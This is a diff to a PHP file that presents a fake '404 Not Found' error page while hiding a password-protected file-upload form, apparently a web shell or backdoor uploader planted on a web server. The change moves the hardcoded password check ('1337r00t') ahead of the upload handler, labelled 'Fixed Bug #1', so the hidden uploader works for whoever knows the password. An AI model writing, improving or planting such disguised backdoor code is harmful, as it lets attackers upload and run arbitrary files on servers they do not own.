@@ -11,7 +11,15 @@ echo"  <title>404 Not Found</title>
 <p>Additionally, a 404 Not Found
 error was encountered while trying to use an ErrorDocument to handle the request.</p>
 </body>";
+/////////////////////////////////////////////////////////////////////
+$password ="1337r00t";   // Your Password
+/////////////////////////////////////////////////////////////////////
+if($_GET['pass']==$password){
+/*
  
+ Fixed Bug #1
+ 
+*/
 if(isset($_POST['uploaded']))
 {
 $file = $_FILES['files']['name'];
@@ -26,10 +34,6 @@ else
 $result = "Fail -_- Try...";
 }
 }
-/////////////////////////////////////////////////////////////////////
-$password ="1337r00t";   // Your Password
-/////////////////////////////////////////////////////////////////////
-if($_GET['pass']==$password){
 echo'
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
